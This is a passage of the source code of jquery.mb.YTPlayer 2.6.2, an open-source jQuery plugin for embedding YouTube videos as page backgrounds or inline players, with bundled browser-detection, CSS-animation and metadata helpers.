/*
 * ******************************************************************************
 *  jquery.mb.components
 *  file: jquery.mb.YTPlayer.js
 *
 *  Copyright (c) 2001-2014. Matteo Bicocchi (Pupunzi);
 *  Open lab srl, Firenze - Italy
 *  email: matteo@open-lab.com
 *  site: 	http://pupunzi.com
 *  blog:	http://pupunzi.open-lab.com
 * 	http://open-lab.com
 *
 *  Licences: MIT, GPL
 *  http://www.opensource.org/licenses/mit-license.php
 *  http://www.gnu.org/licenses/gpl.html
 *
 *  last modified: 27/01/14 20.09
 *  *****************************************************************************
 */

if(typeof ytp != "object")
	ytp ={};

function onYouTubePlayerAPIReady() {

	if(ytp.YTAPIReady)
		return;

	ytp.YTAPIReady=true;
	jQuery(document).trigger("YTAPIReady");
}

(function (jQuery, ytp) {

	ytp.isDevice = 'ontouchstart' in window;

	/*Browser detection patch*/
	if (!jQuery.browser) {
		jQuery.browser = {}, jQuery.browser.mozilla = !1, jQuery.browser.webkit = !1, jQuery.browser.opera = !1, jQuery.browser.safari = !1, jQuery.browser.chrome = !1, jQuery.browser.msie = !1;
		var nAgt = navigator.userAgent;
		jQuery.browser.ua = nAgt, jQuery.browser.name = navigator.appName, jQuery.browser.fullVersion = "" + parseFloat(navigator.appVersion), jQuery.browser.majorVersion = parseInt(navigator.appVersion, 10);
		var nameOffset, verOffset, ix;
		if (-1 != (verOffset = nAgt.indexOf("Opera")))jQuery.browser.opera = !0, jQuery.browser.name = "Opera", jQuery.browser.fullVersion = nAgt.substring(verOffset + 6), -1 != (verOffset = nAgt.indexOf("Version")) && (jQuery.browser.fullVersion = nAgt.substring(verOffset + 8)); else if (-1 != (verOffset = nAgt.indexOf("MSIE")))jQuery.browser.msie = !0, jQuery.browser.name = "Microsoft Internet Explorer", jQuery.browser.fullVersion = nAgt.substring(verOffset + 5); else if (-1 != nAgt.indexOf("Trident")) {
			jQuery.browser.msie = !0, jQuery.browser.name = "Microsoft Internet Explorer";
			var start = nAgt.indexOf("rv:") + 3, end = start + 4;
			jQuery.browser.fullVersion = nAgt.substring(start, end)
		} else-1 != (verOffset = nAgt.indexOf("Chrome")) ? (jQuery.browser.webkit = !0, jQuery.browser.chrome = !0, jQuery.browser.name = "Chrome", jQuery.browser.fullVersion = nAgt.substring(verOffset + 7)) : -1 != (verOffset = nAgt.indexOf("Safari")) ? (jQuery.browser.webkit = !0, jQuery.browser.safari = !0, jQuery.browser.name = "Safari", jQuery.browser.fullVersion = nAgt.substring(verOffset + 7), -1 != (verOffset = nAgt.indexOf("Version")) && (jQuery.browser.fullVersion = nAgt.substring(verOffset + 8))) : -1 != (verOffset = nAgt.indexOf("AppleWebkit")) ? (jQuery.browser.webkit = !0, jQuery.browser.name = "Safari", jQuery.browser.fullVersion = nAgt.substring(verOffset + 7), -1 != (verOffset = nAgt.indexOf("Version")) && (jQuery.browser.fullVersion = nAgt.substring(verOffset + 8))) : -1 != (verOffset = nAgt.indexOf("Firefox")) ? (jQuery.browser.mozilla = !0, jQuery.browser.name = "Firefox", jQuery.browser.fullVersion = nAgt.substring(verOffset + 8)) : (nameOffset = nAgt.lastIndexOf(" ") + 1) < (verOffset = nAgt.lastIndexOf("/")) && (jQuery.browser.name = nAgt.substring(nameOffset, verOffset), jQuery.browser.fullVersion = nAgt.substring(verOffset + 1), jQuery.browser.name.toLowerCase() == jQuery.browser.name.toUpperCase() && (jQuery.browser.name = navigator.appName));
		-1 != (ix = jQuery.browser.fullVersion.indexOf(";")) && (jQuery.browser.fullVersion = jQuery.browser.fullVersion.substring(0, ix)), -1 != (ix = jQuery.browser.fullVersion.indexOf(" ")) && (jQuery.browser.fullVersion = jQuery.browser.fullVersion.substring(0, ix)), jQuery.browser.majorVersion = parseInt("" + jQuery.browser.fullVersion, 10), isNaN(jQuery.browser.majorVersion) && (jQuery.browser.fullVersion = "" + parseFloat(navigator.appVersion), jQuery.browser.majorVersion = parseInt(navigator.appVersion, 10)), jQuery.browser.version = jQuery.browser.majorVersion
	}


	/*******************************************************************************
	 * jQuery.mb.components: jquery.mb.CSSAnimate
	 ******************************************************************************/

	jQuery.fn.CSSAnimate=function(a,b,k,l,f){return this.each(function(){var c=jQuery(this);if(0!==c.length&&a){"function"==typeof b&&(f=b,b=jQuery.fx.speeds._default);"function"==typeof k&&(f=k,k=0);"function"==typeof l&&(f=l,l="cubic-bezier(0.65,0.03,0.36,0.72)");if("string"==typeof b)for(var j in jQuery.fx.speeds)if(b==j){b=jQuery.fx.speeds[j];break}else b=null;if(jQuery.support.transition){var e="",h="transitionEnd";jQuery.browser.webkit?(e="-webkit-",h="webkitTransitionEnd"):jQuery.browser.mozilla? (e="-moz-",h="transitionend"):jQuery.browser.opera?(e="-o-",h="otransitionend"):jQuery.browser.msie&&(e="-ms-",h="msTransitionEnd");j=[];for(d in a){var g=d;"transform"===g&&(g=e+"transform",a[g]=a[d],delete a[d]);"transform-origin"===g&&(g=e+"transform-origin",a[g]=a[d],delete a[d]);j.push(g);c.css(g)||c.css(g,0)}d=j.join(",");c.css(e+"transition-property",d);c.css(e+"transition-duration",b+"ms");c.css(e+"transition-delay",k+"ms");c.css(e+"transition-timing-function",l);c.css(e+"backface-visibility", "hidden");setTimeout(function(){c.css(a)},0);setTimeout(function(){c.called||!f?c.called=!1:f()},b+20);c.on(h,function(a){c.off(h);c.css(e+"transition","");a.stopPropagation();"function"==typeof f&&(c.called=!0,f());return!1})}else{for(var d in a)"transform"===d&&delete a[d],"transform-origin"===d&&delete a[d],"auto"===a[d]&&delete a[d];if(!f||"string"===typeof f)f="linear";c.animate(a,b,f)}}})}; jQuery.fn.CSSAnimateStop=function(){var a="",b="transitionEnd";jQuery.browser.webkit?(a="-webkit-",b="webkitTransitionEnd"):jQuery.browser.mozilla?(a="-moz-",b="transitionend"):jQuery.browser.opera?(a="-o-",b="otransitionend"):jQuery.browser.msie&&(a="-ms-",b="msTransitionEnd");jQuery(this).css(a+"transition","");jQuery(this).off(b)}; jQuery.support.transition=function(){var a=(document.body||document.documentElement).style;return void 0!==a.transition||void 0!==a.WebkitTransition||void 0!==a.MozTransition||void 0!==a.MsTransition||void 0!==a.OTransition}();

	/*
	 * Metadata - jQuery plugin for parsing metadata from elements
	 * Copyright (c) 2006 John Resig, Yehuda Katz, Jörn Zaefferer, Paul McLanahan
	 * Dual licensed under the MIT and GPL licenses:
	 *   http://www.opensource.org/licenses/mit-license.php
	 *   http://www.gnu.org/licenses/gpl.html
	 */

	(function(c){c.extend({metadata:{defaults:{type:"class",name:"metadata",cre:/({.*})/,single:"metadata"},setType:function(b,c){this.defaults.type=b;this.defaults.name=c},get:function(b,f){var d=c.extend({},this.defaults,f);d.single.length||(d.single="metadata");var a=c.data(b,d.single);if(a)return a;a="{}";if("class"==d.type){var e=d.cre.exec(b.className);e&&(a=e[1])}else if("elem"==d.type){if(!b.getElementsByTagName)return;e=b.getElementsByTagName(d.name);e.length&&(a=c.trim(e[0].innerHTML))}else void 0!= b.getAttribute&&(e=b.getAttribute(d.name))&&(a=e);0>a.indexOf("{")&&(a="{"+a+"}");a=eval("("+a+")");c.data(b,d.single,a);return a}}});c.fn.metadata=function(b){return c.metadata.get(this[0],b)}})(jQuery);


	var getYTPVideoID=function(url){
		var movieURL;
		if(url.substr(0,16)=="http://youtu.be/"){
			movieURL= url.replace("http://youtu.be/","");
		}else if(url.indexOf("http")>-1){
			movieURL = url.match(/[\\?&]v=([^&#]*)/)[1];
		}else{
			movieURL = url
		}
		return movieURL;
	};


	jQuery.mbYTPlayer = {
		name           : "jquery.mb.YTPlayer",
		version        : "2.6.2",
		author         : "Matteo Bicocchi",
		defaults       : {
			containment            : "body",
			ratio                  : "16/9",
			showYTLogo             : false,
			videoURL               : null,
			startAt                : 0,
			stopAt                : 0,
			autoPlay               : true,
			vol                    :100,
			addRaster              : false,
			opacity                : 1,
			quality                : "default", //or “small”, “medium”, “large”, “hd720”, “hd1080”, “highres”
			mute                   : false,
			loop                   : true,
			showControls           : true,
			showAnnotations        : false,
			printUrl               : true,
			stopMovieOnClick       :false,
			realfullscreen         :true,
			onReady                : function (player) {},
			onStateChange          : function (player) {},
			onPlaybackQualityChange: function (player) {},
			onError                : function (player) {}
		},
		controls       : {
			play  : "P",
			pause : "p",
			mute  : "M",
			unmute: "A",
			onlyYT: "O",
			showSite: "R",
			ytLogo: "Y"
		},
		rasterImg      : "images/raster.png",
		rasterImgRetina: "images/raster@2x.png",

		locationProtocol: location.protocol != "file:" ? location.protocol : "http:",

		buildPlayer: function (options) {
			return this.each(function () {
				var YTPlayer = this;
				var $YTPlayer = jQuery(YTPlayer);

				YTPlayer.loop = 0;
				YTPlayer.opt = {};
				var property = {};

				$YTPlayer.addClass("mb_YTVPlayer");

				if (jQuery.metadata) {
					jQuery.metadata.setType("class");
					property = $YTPlayer.metadata();
				}

				if (jQuery.isEmptyObject(property))
					property = $YTPlayer.data("property") && typeof $YTPlayer.data("property") == "string" ? eval('(' + $YTPlayer.data("property") + ')') : $YTPlayer.data("property");

				jQuery.extend(YTPlayer.opt, jQuery.mbYTPlayer.defaults, options, property);

				var canGoFullscreen = !(jQuery.browser.msie || jQuery.browser.opera || self.location.href != top.location.href);

				if(!canGoFullscreen)
					YTPlayer.opt.realfullscreen = false;

				if (!$YTPlayer.attr("id"))
					$YTPlayer.attr("id", "id_" + new Date().getTime());

				YTPlayer.opt.id = YTPlayer.id;
				YTPlayer.isAlone = false;

				/*to maintain back compatibility
				 * ***********************************************************/
				if (YTPlayer.opt.isBgndMovie)
					YTPlayer.opt.containment = "body";

				if (YTPlayer.opt.isBgndMovie && YTPlayer.opt.isBgndMovie.mute != undefined)
					YTPlayer.opt.mute = YTPlayer.opt.isBgndMovie.mute;

				if (!YTPlayer.opt.videoURL)
					YTPlayer.opt.videoURL = $YTPlayer.attr("href");

				/************************************************************/

				var playerID = "mbYTP_" + YTPlayer.id;
				var videoID = this.opt.videoURL ? getYTPVideoID(this.opt.videoURL) : $YTPlayer.attr("href") ? getYTPVideoID($YTPlayer.attr("href")) : false;
				YTPlayer.videoID = videoID;

				YTPlayer.opt.showAnnotations = (YTPlayer.opt.showAnnotations) ? '0' : '3';
				var playerVars = { 'autoplay': 0, 'modestbranding': 1, 'controls': 0, 'showinfo': 0, 'rel': 0, 'enablejsapi': 1, 'version': 3, 'playerapiid': playerID, 'origin': '*', 'allowfullscreen': true, 'wmode': 'transparent', 'iv_load_policy': YTPlayer.opt.showAnnotations};

				var canPlayHTML5 = false;
				var v = document.createElement('video');
				if (v.canPlayType ) { // && !jQuery.browser.msie
					canPlayHTML5 = true;
				}

				if (canPlayHTML5) //  && !(YTPlayer.isPlayList && jQuery.browser.msie)
					jQuery.extend(playerVars, {'html5': 1});

				if(jQuery.browser.msie && jQuery.browser.version < 9 ){
					this.opt.opacity = 1;
				}

				var playerBox = jQuery("<div/>").attr("id", playerID).addClass("playerBox");
				var overlay = jQuery("<div/>").css({position: "absolute", top: 0, left: 0, width: "100%", height: "100%"}).addClass("YTPOverlay"); //YTPlayer.isBackground ? "fixed" :

				YTPlayer.opt.containment = YTPlayer.opt.containment == "self" ? jQuery(this) : jQuery(YTPlayer.opt.containment);
				YTPlayer.isBackground = YTPlayer.opt.containment.get(0).tagName.toLowerCase() == "body";


				if(!YTPlayer.opt.containment.is(jQuery(this))){
					$YTPlayer.hide();
				}else{
					YTPlayer.isPlayer = true;
				}

				if (ytp.isDevice && YTPlayer.isBackground){
					$YTPlayer.hide();
					return;
				}

				if (YTPlayer.opt.addRaster) {
					var retina = (window.retina || window.devicePixelRatio > 1);
					overlay.addClass(retina ? "raster retina" : "raster");
				}else{
					overlay.removeClass("raster retina");
				}

				var wrapper = jQuery("<div/>").addClass("mbYTP_wrapper").attr("id", "wrapper_" + playerID);
				wrapper.css({position: "absolute", zIndex: 0, minWidth: "100%", minHeight: "100%",left:0, top:0, overflow: "hidden", opacity: 0});
				playerBox.css({position: "absolute", zIndex: 0, width: "100%", height: "100%", top: 0, left: 0, overflow: "hidden", opacity: this.opt.opacity});
				wrapper.append(playerBox);

				if (YTPlayer.isBackground && ytp.backgroundIsInited)
					return;

				YTPlayer.opt.containment.children().each(function () {
					if (jQuery(this).css("position") == "static")
						jQuery(this).css("position", "relative");
				});

				if (YTPlayer.isBackground) {
					jQuery("body").css({position: "relative", minWidth: "100%", minHeight: "100%", zIndex: 1, boxSizing: "border-box"});
					wrapper.css({position: "fixed", top: 0, left: 0, zIndex: 0});
					$YTPlayer.hide();
					YTPlayer.opt.containment.prepend(wrapper);
				} else{

					if(YTPlayer.opt.containment.css("position") =="static")
						YTPlayer.opt.containment.css({position: "relative"});

					YTPlayer.opt.containment.prepend(wrapper);
				}

				YTPlayer.wrapper = wrapper;

				playerBox.css({opacity: 1});

				if (!ytp.isDevice){
					playerBox.after(overlay);
					YTPlayer.overlay = overlay;
				}


				if(!YTPlayer.isBackground){
					overlay.on("mouseenter",function(){
						$YTPlayer.find(".mb_YTVPBar").addClass("visible");
					}).on("mouseleave",function(){
								$YTPlayer.find(".mb_YTVPBar").removeClass("visible");
							})
				}

				if(!ytp.YTAPIReady){
					jQuery("#YTAPI").remove();
					var tag = jQuery("<script></script>").attr({"src":jQuery.mbYTPlayer.locationProtocol+"//www.youtube.com/player_api?v=" + jQuery.mbYTPlayer.version, "id": "YTAPI"});
					jQuery("head title").after(tag);

				}else{
					setTimeout(function(){
						jQuery(document).trigger("YTAPIReady");
					}, 100)
				}

				jQuery(document).on("YTAPIReady", function () {

					if ((YTPlayer.isBackground && ytp.backgroundIsInited) || YTPlayer.isInit)
						return;

					if(YTPlayer.isBackground && YTPlayer.opt.stopMovieOnClick)
						jQuery(document).off("mousedown.ytplayer").on("mousedown,.ytplayer",function(e){
							var target = jQuery(e.target);
							if(target.is("a") || target.parents().is("a")){
								$YTPlayer.pauseYTP();
							}
						});

					if (YTPlayer.isBackground)
						ytp.backgroundIsInited = true;

					YTPlayer.isInit = true;

					YTPlayer.opt.vol = YTPlayer.opt.vol ? YTPlayer.opt.vol : 100;

					jQuery.mbYTPlayer.getDataFromFeed(YTPlayer.videoID, YTPlayer);

					jQuery(YTPlayer).on("YTPChanged", function () {

						if(ytp.isDevice && !YTPlayer.isBackground){
							new YT.Player(playerID, {
								height: '100%',
								width: '100%',
								videoId: YTPlayer.videoID,
								events: {
									'onReady': function(event){
										YTPlayer.player = event.target;
										playerBox.css({opacity: 1});
										YTPlayer.wrapper.css({opacity: 1});
										$YTPlayer.optimizeDisplay();
									},
									'onStateChange': function(){}
								}
							});
							return;
						}

						new YT.Player(playerID, {
							videoId   : YTPlayer.videoID.toString(),
							playerVars: playerVars,
							events    : {
								'onReady': function (event) {

									YTPlayer.player = event.target;

									if(YTPlayer.isReady)
										return;

									YTPlayer.isReady = true;

									YTPlayer.playerEl = YTPlayer.player.getIframe();
									$YTPlayer.optimizeDisplay();

									YTPlayer.videoID = videoID;

									jQuery(window).on("resize.YTP",function () {
										$YTPlayer.optimizeDisplay();
									});

									if (YTPlayer.opt.showControls)
										jQuery(YTPlayer).buildYTPControls();

									YTPlayer.player.setPlaybackQuality(YTPlayer.opt.quality);
									YTPlayer.player.setVolume(YTPlayer.opt.vol);
									YTPlayer.player.seekTo(parseFloat(YTPlayer.opt.startAt), true);

									jQuery.mbYTPlayer.checkForState(YTPlayer);

									YTPlayer.checkForStartAt = setInterval(function () {
										if (YTPlayer.player.getCurrentTime() >= YTPlayer.opt.startAt && YTPlayer.player.getDuration()>0) {
											clearInterval(YTPlayer.checkForStartAt);

											if (typeof YTPlayer.opt.onReady == "function")
												YTPlayer.opt.onReady($YTPlayer);


											if (YTPlayer.opt.autoPlay)
												$YTPlayer.playYTP();
											else
												$YTPlayer.pauseYTP();

											setTimeout(function(){
												$YTPlayer.css("background-image", "none");
												YTPlayer.wrapper.CSSAnimate({opacity: YTPlayer.isAlone ? 1 : YTPlayer.opt.opacity}, 2000);
											},500);

											jQuery.mbYTPlayer.checkForState(YTPlayer);

										}

									}, 1);


								},

								'onStateChange'          : function (event) {

									/*
									 -1 (unstarted)
									 0 (ended)
									 1 (playing)
									 2 (paused)
									 3 (buffering)
									 5 (video cued).
									 */

									if (typeof event.target.getPlayerState != "function")
										return;
									var state = event.target.getPlayerState();

									if (typeof YTPlayer.opt.onStateChange == "function")
										YTPlayer.opt.onStateChange($YTPlayer, state);

									var controls = jQuery("#controlBar_" + YTPlayer.id);

									var data = YTPlayer.opt;

									if (state == 0) { // end
										if (YTPlayer.state == state)
											return;

										YTPlayer.state = state;
										YTPlayer.player.pauseVideo();
										var startAt = YTPlayer.opt.startAt ? YTPlayer.opt.startAt : 1;

										if (data.loop) {
											YTPlayer.wrapper.css({opacity: 0});
											$YTPlayer.playYTP();
											YTPlayer.player.seekTo(startAt,true);

										} else if (!YTPlayer.isBackground) {
											YTPlayer.player.seekTo(startAt, true);
											$YTPlayer.playYTP();
											setTimeout(function () {
												$YTPlayer.pauseYTP();
											}, 10);
										}

										if (!data.loop && YTPlayer.isBackground)
											YTPlayer.wrapper.CSSAnimate({opacity: 0}, 2000);
										else if (data.loop) {
											YTPlayer.wrapper.css({opacity: 0});
											YTPlayer.loop++;
										}

										controls.find(".mb_YTVPPlaypause").html(jQuery.mbYTPlayer.controls.play);
										jQuery(YTPlayer).trigger("YTPEnd");
									}

									if (state == 3) { // buffering
										if (YTPlayer.state == state)
											return;

										clearTimeout(YTPlayer.fadeOnStart);

										YTPlayer.state = state;
										YTPlayer.player.setPlaybackQuality(YTPlayer.opt.quality);
										controls.find(".mb_YTVPPlaypause").html(jQuery.mbYTPlayer.controls.play);
										jQuery(YTPlayer).trigger("YTPBuffering");
									}

									if (state == -1) { // unstarted
										if (YTPlayer.state == state)
											return;
										YTPlayer.state = state;

										YTPlayer.wrapper.css({opacity:0});

										jQuery(YTPlayer).trigger("YTPUnstarted");
									}

									if (state == 1) { // play
										if (YTPlayer.state == state)
											return;
										YTPlayer.state = state;

										if(YTPlayer.opt.mute){
											$YTPlayer.muteYTPVolume();
											YTPlayer.opt.mute = false;
										}

										controls.find(".mb_YTVPPlaypause").html(jQuery.mbYTPlayer.controls.pause);

										jQuery(YTPlayer).trigger("YTPStart");

										if (typeof _gaq != "undefined")
											_gaq.push(['_trackEvent', 'YTPlayer', 'Play', (YTPlayer.title || YTPlayer.videoID.toString())]);

									}

									if (state == 2) { // pause
										if (YTPlayer.state == state)
											return;
										YTPlayer.state = state;
										controls.find(".mb_YTVPPlaypause").html(jQuery.mbYTPlayer.controls.play);
										jQuery(YTPlayer).trigger("YTPPause");
									}
								},
								'onPlaybackQualityChange': function (e) {
									if (typeof YTPlayer.opt.onPlaybackQualityChange == "function")
										YTPlayer.opt.onPlaybackQualityChange($YTPlayer);
								},
								'onError'                : function (err) {

									if(err.data == 2 && YTPlayer.isPlayList)
										jQuery(YTPlayer).playNext();

									if (typeof YTPlayer.opt.onError == "function")
										YTPlayer.opt.onError($YTPlayer, err);
								}
							}
						});
					});
				})
			});
		},

		getDataFromFeed: function (videoID, YTPlayer) {
			//Get video info from FEEDS API

			YTPlayer.videoID = videoID;
			if (!jQuery.browser.msie) { //!(jQuery.browser.msie && jQuery.browser.version<9)

				jQuery.getJSON(jQuery.mbYTPlayer.locationProtocol+'//gdata.youtube.com/feeds/api/videos/' + videoID + '?v=2&alt=jsonc', function (data, status, xhr) {

					YTPlayer.dataReceived = true;

					var videoData = data.data;

					YTPlayer.title = videoData.title;
					YTPlayer.videoData = videoData;

					if (YTPlayer.opt.ratio == "auto")
						if (videoData.aspectRatio && videoData.aspectRatio === "widescreen")
							YTPlayer.opt.ratio = "16/9";
						else
							YTPlayer.opt.ratio = "4/3";

					if(!YTPlayer.hasData){
						YTPlayer.hasData = true;

						if (YTPlayer.isPlayer) {
							var bgndURL = YTPlayer.videoData.thumbnail.hqDefault;
							YTPlayer.opt.containment.css({background: "rgba(0,0,0,0.5) url(" + bgndURL + ") center center", backgroundSize: "cover"});
						}
						jQuery(YTPlayer).trigger("YTPChanged");
					}
				});

				setTimeout(function(){
					if(!YTPlayer.dataReceived && !YTPlayer.hasData){
						YTPlayer.hasData = true;
						jQuery(YTPlayer).trigger("YTPChanged");
					}
				},1500)

			} else {
				if(YTPlayer.opt.ratio == "auto"){
					YTPlayer.opt.ratio = "16/9";
				}

				if(!YTPlayer.hasData){
					YTPlayer.hasData = true;
					setTimeout(function(){
						jQuery(YTPlayer).trigger("YTPChanged");
					},100)
				}
			}
		},

		getVideoID: function(){
			var YTPlayer = this.get(0);
			return YTPlayer.videoID || false ;
		},

		setVideoQuality: function(quality){
			var YTPlayer = this.get(0);
			YTPlayer.player.setPlaybackQuality(quality);
		},

		YTPlaylist : function(videos, shuffle, callback){
			var YTPlayer = this.get(0);

			YTPlayer.isPlayList = true;

			if(shuffle)
				videos = jQuery.shuffle(videos);

			if(!YTPlayer.videoID){
				YTPlayer.videos = videos;
				YTPlayer.videoCounter = 0;
				YTPlayer.videoLength = videos.length;

				jQuery(YTPlayer).data("property", videos[0]);
				jQuery(YTPlayer).mb_YTPlayer();
			}

			if(typeof callback == "function")
				jQuery(YTPlayer).on("YTPChanged",function(){
					callback(YTPlayer);
				});

			jQuery(YTPlayer).on("YTPEnd", function(){
				jQuery(YTPlayer).playNext();
			});
		},

		playNext: function(){
			var YTPlayer = this.get(0);
			YTPlayer.videoCounter++;
			if(YTPlayer.videoCounter>=YTPlayer.videoLength)
				YTPlayer.videoCounter = 0;
			jQuery(YTPlayer.playerEl).css({opacity:0});
			jQuery(YTPlayer).changeMovie(YTPlayer.videos[YTPlayer.videoCounter]);
		},

		playPrev: function(){
			var YTPlayer = this.get(0);
			YTPlayer.videoCounter--;
			if(YTPlayer.videoCounter<0)
				YTPlayer.videoCounter = YTPlayer.videoLength-1;
			jQuery(YTPlayer.playerEl).css({opacity:0});
			jQuery(YTPlayer).changeMovie(YTPlayer.videos[YTPlayer.videoCounter]);
		},

		changeMovie: function (opt) {
			var YTPlayer = this.get(0);
			var data = YTPlayer.opt;

			if (opt) {
				jQuery.extend(data, opt);
			}

			YTPlayer.videoID = getYTPVideoID(data.videoURL);

			jQuery(YTPlayer).pauseYTP();
			var timer = jQuery.browser.msie ? 1000 : 0;
			jQuery(YTPlayer.playerEl).CSSAnimate({opacity:0},timer);


			setTimeout(function(){
				jQuery(YTPlayer).getPlayer().cueVideoByUrl(encodeURI(jQuery.mbYTPlayer.locationProtocol+"//www.youtube.com/v/" + YTPlayer.videoID) , 5 , YTPlayer.opt.quality);
				jQuery(YTPlayer).playYTP();
				jQuery(YTPlayer).one("YTPStart", function(){
					YTPlayer.wrapper.CSSAnimate({opacity: YTPlayer.isAlone ? 1 : YTPlayer.opt.opacity}, 1000);
					jQuery(YTPlayer.playerEl).CSSAnimate({opacity:1},timer);
				});

				if (YTPlayer.opt.mute) {
					jQuery(YTPlayer).muteYTPVolume();
				}else{
					jQuery(YTPlayer).unmuteYTPVolume();
				}

			},timer);

			if (YTPlayer.opt.addRaster) {
				var retina = (window.retina || window.devicePixelRatio > 1);
				YTPlayer.overlay.addClass(retina ? "raster retina" : "raster");
			}else{
				YTPlayer.overlay.removeClass("raster");
				YTPlayer.overlay.removeClass("retina");
			}

			jQuery("#controlBar_" + YTPlayer.id).remove();

			if (YTPlayer.opt.showControls)
				jQuery(YTPlayer).buildYTPControls();

			jQuery.mbYTPlayer.getDataFromFeed(YTPlayer.videoID, YTPlayer);
			jQuery(YTPlayer).optimizeDisplay();
			jQuery.mbYTPlayer.checkForState(YTPlayer);

		},

		getPlayer: function () {
			return jQuery(this).get(0).player;
		},

		playerDestroy: function () {
			var YTPlayer = this.get(0);
			ytp.YTAPIReady = false;
			ytp.backgroundIsInited = false;
			YTPlayer.isInit = false;
			YTPlayer.videoID = null;

			var playerBox = YTPlayer.wrapper;
			playerBox.remove();
			jQuery("#controlBar_" + YTPlayer.id).remove();
		},

		fullscreen: function(real) {

			var YTPlayer = this.get(0);

			if( typeof real == "undefined")
				real = YTPlayer.opt.realfullscreen;

			real = eval(real);

			var controls = jQuery("#controlBar_" + YTPlayer.id);
			var fullScreenBtn = controls.find(".mb_OnlyYT");
			var videoWrapper = YTPlayer.isBackground ? jQuery(YTPlayer.wrapper) : jQuery(YTPlayer);

			if(real){
				var fullscreenchange = jQuery.browser.mozilla ? "mozfullscreenchange" : jQuery.browser.webkit ? "webkitfullscreenchange" : "fullscreenchange";
				jQuery(document).off(fullscreenchange).on(fullscreenchange, function() {
					var isFullScreen = RunPrefixMethod(document, "IsFullScreen") || RunPrefixMethod(document, "FullScreen");

					if (!isFullScreen) {
						YTPlayer.isAlone = false;
						fullScreenBtn.html(jQuery.mbYTPlayer.controls.onlyYT)
						jQuery(YTPlayer).setVideoQuality(YTPlayer.opt.quality);
						jQuery(YTPlayer).removeClass("fullscreen");

						if (YTPlayer.isBackground){
							jQuery("body").after(controls);
						}else{
							YTPlayer.wrapper.before(controls);
						}
						jQuery(window).resize();
					}else{
						jQuery(YTPlayer).setVideoQuality("default");
					}
				});
			}

			if (!YTPlayer.isAlone) {

				if(YTPlayer.player.getPlayerState() != 1 && YTPlayer.player.getPlayerState() != 2)
					jQuery(YTPlayer).playYTP();

				if(real){
					YTPlayer.wrapper.append(controls);

					launchFullscreen(videoWrapper.get(0));
					jQuery(YTPlayer).css({opacity:0}).addClass("fullscreen");
					setTimeout(function(){
						videoWrapper.CSSAnimate({zIndex: 10000, opacity:1},1000);
					},1000)
				} else
					videoWrapper.css({zIndex: 10000}).CSSAnimate({opacity: 1}, 1000, 0);


				jQuery(YTPlayer).trigger("YTPFullScreenStart");

				fullScreenBtn.html(jQuery.mbYTPlayer.controls.showSite)
				YTPlayer.isAlone = true;

			} else {

				if(real){
					cancelFullscreen();
				} else{
					videoWrapper.CSSAnimate({opacity: YTPlayer.opt.opacity}, 500);
					videoWrapper.css({zIndex: 0});
				}

				jQuery(YTPlayer).trigger("YTPFullScreenEnd");

				fullScreenBtn.html(jQuery.mbYTPlayer.controls.onlyYT)
				YTPlayer.isAlone = false;
			}

			function RunPrefixMethod(obj, method) {
				var pfx = ["webkit", "moz", "ms", "o", ""];
				var p = 0, m, t;
				while (p < pfx.length && !obj[m]) {
					m = method;
					if (pfx[p] == "") {
						m = m.substr(0,1).toLowerCase() + m.substr(1);
					}
					m = pfx[p] + m;
					t = typeof obj[m];
					if (t != "undefined") {
						pfx = [pfx[p]];
						return (t == "function" ? obj[m]() : obj[m]);
					}
					p++;
				}
			}

			function launchFullscreen(element) {
				RunPrefixMethod(element, "RequestFullScreen");
			}

			function cancelFullscreen() {
				if (RunPrefixMethod(document, "FullScreen") || RunPrefixMethod(document, "IsFullScreen")) {
					RunPrefixMethod(document, "CancelFullScreen");
				}
			}
		},

		playYTP: function () {
			var YTPlayer = this.get(0);

			if(typeof YTPlayer.player === "undefined")
				return;

			var controls = jQuery("#controlBar_" + YTPlayer.id);
			var playBtn = controls.find(".mb_YTVPPlaypause");
			playBtn.html(jQuery.mbYTPlayer.controls.pause);
			YTPlayer.player.playVideo();

			//YTPlayer.wrapper.CSSAnimate({opacity: YTPlayer.opt.opacity}, 2000);
			jQuery(YTPlayer).on("YTPStart", function(){
				jQuery(YTPlayer).css("background-image", "none");
			})
		},

		toggleLoops: function () {
			var YTPlayer = this.get(0);
			var data = YTPlayer.opt;
			if (data.loop == 1) {
				data.loop = 0;
			} else {
				if(data.startAt) {
					YTPlayer.player.seekTo(data.startAt);
				} else {
					YTPlayer.player.playVideo();
				}
				data.loop = 1;
			}
		},

		stopYTP: function () {
			var YTPlayer = this.get(0);
			var controls = jQuery("#controlBar_" + YTPlayer.id);
			var playBtn = controls.find(".mb_YTVPPlaypause");
			playBtn.html(jQuery.mbYTPlayer.controls.play);
			YTPlayer.player.stopVideo();
		},

		pauseYTP: function () {
			var YTPlayer = this.get(0);
			var data = YTPlayer.opt;
			var controls = jQuery("#controlBar_" + YTPlayer.id);
			var playBtn = controls.find(".mb_YTVPPlaypause");
			playBtn.html(jQuery.mbYTPlayer.controls.play);
			YTPlayer.player.pauseVideo();
		},

		seekToYTP: function(val) {
			var YTPlayer = this.get(0);
			YTPlayer.player.seekTo(val,true);
		},

		setYTPVolume: function (val) {
			var YTPlayer = this.get(0);
			if (!val && !YTPlayer.opt.vol && YTPlayer.player.getVolume() == 0)
				jQuery(YTPlayer).unmuteYTPVolume();
			else if ((!val && YTPlayer.player.getVolume() > 0) || (val && YTPlayer.player.getVolume() == val))
				jQuery(YTPlayer).muteYTPVolume();
			else
				YTPlayer.opt.vol = val;
			YTPlayer.player.setVolume(YTPlayer.opt.vol);
		},

		muteYTPVolume: function () {
			var YTPlayer = this.get(0);
			YTPlayer.opt.vol = YTPlayer.player.getVolume() || 50;
			YTPlayer.player.mute();
			YTPlayer.player.setVolume(0);
			var controls = jQuery("#controlBar_" + YTPlayer.id);
			var muteBtn = controls.find(".mb_YTVPMuteUnmute");
			muteBtn.html(jQuery.mbYTPlayer.controls.unmute);
			jQuery(YTPlayer).addClass("isMuted");
			jQuery(YTPlayer).trigger("YTPMuted");
		},

		unmuteYTPVolume: function () {
			var YTPlayer = this.get(0);

			YTPlayer.player.unMute();
			YTPlayer.player.setVolume(YTPlayer.opt.vol);

			var controls = jQuery("#controlBar_" + YTPlayer.id);
			var muteBtn = controls.find(".mb_YTVPMuteUnmute");
			muteBtn.html(jQuery.mbYTPlayer.controls.mute);

			jQuery(YTPlayer).removeClass("isMuted");
			jQuery(YTPlayer).trigger("YTPUnmuted");

		},

		manageYTPProgress: function () {

			var YTPlayer = this.get(0);
			var controls = jQuery("#controlBar_" + YTPlayer.id);
			var progressBar = controls.find(".mb_YTVPProgress");
			var loadedBar = controls.find(".mb_YTVPLoaded");
